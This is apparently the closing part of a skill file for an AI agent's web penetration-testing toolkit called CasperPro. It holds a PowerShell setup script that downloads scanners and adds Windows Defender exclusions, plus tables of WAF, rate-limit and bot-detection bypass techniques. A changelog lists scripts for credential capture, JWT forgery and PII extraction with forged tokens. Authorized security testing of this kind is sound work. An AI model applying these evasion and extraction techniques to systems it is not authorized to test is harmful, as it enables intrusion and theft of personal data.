# Initialize project and install Python packages with uv
uv init casper-pentest
Set-Location casper-pentest
uv add mitmproxy playwright pyjwt aiohttp

# Install mitmproxy as global tool
uv tool install mitmproxy

# Playwright browsers
uv run playwright install chromium

# Security tools (download to ~/tools)
$toolsDir = "$env:USERPROFILE\tools"
New-Item -ItemType Directory -Path $toolsDir -Force

# nuclei
Invoke-WebRequest -Uri "https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_windows_amd64.zip" -OutFile "$env:TEMP\nuclei.zip"
Expand-Archive -Path "$env:TEMP\nuclei.zip" -DestinationPath "$toolsDir\nuclei" -Force

# ffuf
Invoke-WebRequest -Uri "https://github.com/ffuf/ffuf/releases/latest/download/ffuf_windows_amd64.zip" -OutFile "$env:TEMP\ffuf.zip"
Expand-Archive -Path "$env:TEMP\ffuf.zip" -DestinationPath "$toolsDir\ffuf" -Force

# sqlmap (clone and run with uv)
git clone https://github.com/sqlmapproject/sqlmap.git "$toolsDir\sqlmap"

# Add to PATH
$env:Path += ";$toolsDir\nuclei;$toolsDir\ffuf"
[Environment]::SetEnvironmentVariable("Path", $env:Path, "User")

# Windows Defender exclusions (run as Administrator)
Add-MpPreference -ExclusionPath $toolsDir
Add-MpPreference -ExclusionProcess "nuclei.exe", "ffuf.exe"
```

See **casperpro-windows.md** for complete Windows implementation including:
- PowerShell HTTP client functions
- Windows mitmproxy integration
- Playwright automation scripts
- IDOR, JWT, injection, and race condition testing
- Complete assessment script

## Reference Documents

Detailed methodologies are available in the casperpro-skill/ directory:

### Core Modules
- **casperpro-discovery.md** - Traffic interception, API discovery with mitmproxy addons
- **casperpro-authentication.md** - JWT capture/manipulation, OAuth testing, session analysis
- **casperpro-automation.md** - Complete Python automation framework with parallel testing

### Advanced Attack Modules
- **casperpro-injection-advanced.md** - SSRF chains, deserialization, request smuggling, cache poisoning, prototype pollution
- **casperpro-evasion.md** - WAF bypass (Cloudflare, AWS WAF, ModSecurity), rate limit evasion, bot detection bypass
- **casperpro-api-advanced.md** - GraphQL introspection/injection, WebSocket hijacking, gRPC security testing
- **casperpro-business-logic.md** - Financial app testing, e-commerce security, workflow/state machine testing

### Enterprise Modules
- **casperpro-reporting.md** - CVSS 3.1 calculator, compliance mapping (OWASP/PCI-DSS/HIPAA), report generation (JSON/Markdown/HTML)
- **casperpro-tools-integration.md** - Integration with nuclei, sqlmap, ffuf, interactsh for comprehensive scanning

### Comprehensive Testing Modules (NEW)
- **casperpro-business-logic-advanced.md** - Financial transactions, e-commerce logic, workflow/state machines, multi-tenant isolation
- **casperpro-edge-cases.md** - Type juggling, unicode normalization, mass assignment, HTTP parameter pollution, prototype pollution, ReDoS
- **casperpro-enterprise-tech.md** - LDAP, SAML/SSO, OAuth/OIDC, GraphQL enterprise, message queues, document generation, webhook SSRF

### CI/CD & Automation
- **casperpro-cicd.md** - GitHub Actions, GitLab CI, Jenkins pipelines, Docker integration, SARIF output, Slack/Teams notifications

### Platform-Specific Modules
- **casperpro-windows.md** - Complete Windows/PowerShell implementation with native functions for IDOR, JWT, injection, and race condition testing

## Enterprise Capabilities

### CVSS 3.1 Severity Scoring

Automatic CVSS calculation for all findings with full vector notation:

| Vulnerability Type | Base Score | Vector |
|--------------------|------------|--------|
| SQL Injection | 9.8 Critical | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| Remote Code Execution | 9.8 Critical | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| SSRF (Internal Access) | 9.1 Critical | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L |
| Authentication Bypass | 8.6 High | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L |
| IDOR | 7.5 High | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| Stored XSS | 6.1 Medium | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |
| CSRF | 4.3 Medium | AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N |

### Compliance Mapping

Automatic mapping of findings to compliance frameworks:

| Framework | Coverage |
|-----------|----------|
| **OWASP Top 10 2021** | A01-A10 full mapping with CWE references |
| **PCI-DSS 4.0** | Requirements 6.2, 6.3, 6.4 for web application security |
| **HIPAA** | Technical safeguards (45 CFR § 164.312) |
| **CWE** | Common Weakness Enumeration IDs for each finding |
| **NIST CSF** | Identify, Protect, Detect, Respond mapping |

### WAF Bypass Capabilities

Techniques for bypassing common security controls:

| WAF/Protection | Bypass Methods |
|----------------|----------------|
| **Cloudflare** | Header rotation, IP spoofing, cache manipulation |
| **AWS WAF** | Encoding variations, chunked transfer, parameter pollution |
| **ModSecurity** | Unicode normalization, comment injection, case manipulation |
| **Rate Limiting** | Distributed requests, header rotation, IP cycling |
| **Bot Detection** | Playwright stealth mode, realistic timing, fingerprint spoofing |

### Advanced Attack Types

| Attack Category | Techniques |
|-----------------|------------|
| **SSRF** | Protocol smuggling, DNS rebinding, cloud metadata access |
| **Deserialization** | Java, PHP, Python, .NET gadget chains |
| **Request Smuggling** | CL.TE, TE.CL, TE.TE variants |
| **Cache Poisoning** | Host header attacks, parameter cloaking, fat GET |
| **Prototype Pollution** | Client-side and server-side exploitation |
| **GraphQL** | Introspection bypass, batch attacks, query depth exploitation |
| **WebSocket** | CSWSH, message manipulation, origin bypass |

### Tool Integration

| Tool | Purpose | Integration |
|------|---------|-------------|
| **nuclei** | Template-based vulnerability scanning | Automated scanning with custom templates |
| **sqlmap** | SQL injection exploitation | Automated SQLi detection and exploitation |
| **ffuf** | Fast web fuzzing | Endpoint discovery, parameter fuzzing |
| **interactsh** | Out-of-band testing | SSRF, XXE, blind injection verification |

### Report Formats

| Format | Use Case |
|--------|----------|
| **JSON** | Machine-readable, CI/CD integration |
| **Markdown** | Developer-friendly, Git documentation |
| **HTML** | Executive reports with styling and charts |
| **CSV** | Spreadsheet analysis, compliance tracking |

## Ethical Guidelines

### Legal Requirements
- Obtain written authorization before testing
- Test only within defined scope
- Respect system boundaries
- Avoid causing harm or disruption

### Professional Standards
- Maintain confidentiality
- Report vulnerabilities responsibly
- Follow disclosure timelines
- Provide constructive remediation guidance

### Testing Philosophy
- Use safe, non-destructive payloads
- Test in isolated environments when possible
- Minimize impact on production systems
- Document all testing activities thoroughly

## Version Information

**Version:** 2.4  
**Last Updated:** 2026-01-13  
**Compatibility:** OpenCode Agent Skills Framework  
**Stack:** curl + mitmproxy + playwright + uv + python + powershell  
**Edition:** Enterprise  
**Platforms:** macOS, Linux, Windows  
**Python Package Manager:** uv (REQUIRED - never use pip)

### Changelog

**v2.4 (2026-01-13)** - Burp Suite Equivalence & JWT Forgery
- Added comprehensive "Burp Suite Feature Equivalence with mitmproxy" section
- Documented exact hook mappings: `request()` = Intercept, `response()` = Response modification
- Added 5 pre-built mitmproxy addon scripts in `scripts/` directory:
  - `burp_equivalent.py` - Full Burp Suite equivalent (scope, intercept, match & replace, history)
  - `intruder_addon.py` - Sniper/Battering Ram fuzzing with SQL/NoSQL/IDOR payloads
  - `live_intercept.py` - Real-time credential capture, JWT replacement, PII detection
  - `jwt_forge.py` - JWT forgery (HS256/HS512, none algorithm, kid bypass)
  - `pii_extractor.py` - Automated PII extraction using forged tokens
- Documented crAPI Challenge 15 solution (weak JWT secret "crapi" allows token forgery)
- Added feature comparison table showing mitmproxy provides 90-95% of Burp Suite Pro capabilities
- Added real-time interception code examples

**v2.3 (2026-01-12)** - Minor Updates
- Documentation improvements

**v2.2 (2026-01-11)** - Comprehensive Enterprise Edition
- **BREAKING**: All Python package management now uses `uv` exclusively (pip removed)
- Added comprehensive business logic testing (financial, e-commerce, workflow)
- Added multi-tenant isolation testing
- Added edge cases and hard-to-find issues (type juggling, unicode, mass assignment, HPP, prototype pollution, ReDoS)
- Added enterprise technology testing (LDAP, SAML, OAuth, GraphQL enterprise, message queues, webhooks)
- Added complete enterprise assessment orchestrator
- Expanded Windows module with 7 comprehensive test categories
- Added 50+ new attack payloads across all modules

**v2.1 (2026-01-11)** - Windows Support
- Added complete Windows/PowerShell support module (casperpro-windows.md)
- PowerShell 7+ native HTTP client functions
- Windows-specific mitmproxy integration
- Playwright automation on Windows
- Parallel testing using PowerShell jobs
- Windows installation scripts (winget, uv)
- Windows Defender exclusion guidance
- Complete Windows assessment script

**v2.0 (2026-01-11)** - Enterprise Edition
- Added CVSS 3.1 automatic severity scoring
- Added compliance mapping (OWASP Top 10 2021, PCI-DSS 4.0, HIPAA)
- Added advanced injection module (SSRF, deserialization, request smuggling, cache poisoning)
- Added WAF bypass and evasion techniques (Cloudflare, AWS WAF, ModSecurity)
- Added GraphQL, WebSocket, and gRPC security testing
- Added business logic testing (financial apps, e-commerce, workflow attacks)
- Added nuclei, sqlmap, ffuf, interactsh integration
- Added enterprise reporting (JSON, Markdown, HTML with styling)
- Complete installation guides for macOS, Linux, Windows

**v1.0 (2026-01-11)** - Initial Release
- Core stack: curl + mitmproxy + playwright + python
- Traffic interception and API discovery
- Authentication testing (JWT, OAuth, sessions)
- Basic injection and IDOR testing
- Automation framework

---

**Remember:** This stack provides capabilities that exceed traditional tools like Burp Suite. With great power comes great responsibility. Always operate within legal and ethical boundaries.
